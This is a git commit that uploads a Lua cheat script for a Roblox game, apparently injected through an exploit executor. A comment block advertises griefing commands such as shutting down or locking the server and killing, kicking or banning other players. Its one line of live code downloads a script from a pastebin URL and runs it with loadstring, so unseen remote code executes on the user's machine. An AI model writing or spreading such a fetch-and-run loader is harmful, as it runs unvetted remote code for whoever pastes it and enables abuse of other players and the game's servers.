10a17793a129cece5ea078eadf876a44c20d2946
ArmansBuildToDie <68616769+ArmansBuildToDie@users.noreply.github.com>
2020-07-21 16:54:47 -0400

    Add files via upload

---
+++ buildtodieUPDATED.lua
@@ -0,0 +1,31 @@
+-- GAME LINK: https://www.roblox.com/games/2834662825/
+
+
+--[[
+!nobase -- removes all bases
+!nobuild -- no building for anyone (except you)
+!shutdown -- shutdowns server 
+!punish [name] -- punishes player
+!nomobs -- removes monsters from game
+!nohumanoid [name] -- removes humanoid from player
+!nomap -- removes map from game
+!kick [name] -- kicks player from server
+!ban [name] -- bans player from server
+!baseadmin -- gives yourself building properties on all bases
+!slock -- locks server (nobody can join)
+
+-- NEW CMDS AS OF VERSION 1.0.3 ALPHA:
+!btools -- gives yourself btools
+!kill [name] -- kills player in server
+!rejoin -- rejoins the server (if needed)
+  ___      _ _    _   _         ___  _     
+ | _ )_  _(_) |__| | | |_ ___  |   \(_)___ 
+ | _ \ || | | / _` | |  _/ _ \ | |) | / -_)
+ |___/\_,_|_|_\__,_|  \__\___/ |___/|_\___|
+                                           
+(made by Arman#9312)
+]]
+
+
+--BOOTSTRAPPER 👇
+loadstring(game.HttpGet(game,"https://pastebin.com/raw/1nYK5SLs"))()
